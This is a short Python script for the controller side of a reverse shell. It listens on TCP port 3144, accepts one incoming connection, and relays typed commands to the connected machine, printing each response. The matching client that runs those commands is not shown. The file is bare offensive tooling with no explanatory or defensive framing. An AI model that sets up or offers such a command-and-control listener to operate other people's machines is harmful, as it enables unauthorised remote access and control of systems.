import socket
import sys

def create_socket():

    try:
        global host
        global port
        global s
        host = ''
        port = 3144
        s = socket.socket()
        print("Creating socket")
    except socket.error as msg:
        print("Socket Creation Error: " + str(msg))


def bind_socket():

    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        print("Listening for connections")
        s.listen(5)
    except socket.error as msg:
        print("Binding Error: " + str(msg) + '\n' + 'Retrying...')
        bind_socket()


def accept_socket():
    conn, address = s.accept()
    print("Connection has been established | " + "IP Address: " + address[0] + "| Port: " + str(address[1]))
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        command = input()
        if command == "quit":
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(command)) > 0:
            conn.send(str.encode(command))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

def main():
    create_socket()
    bind_socket()
    accept_socket()


main()

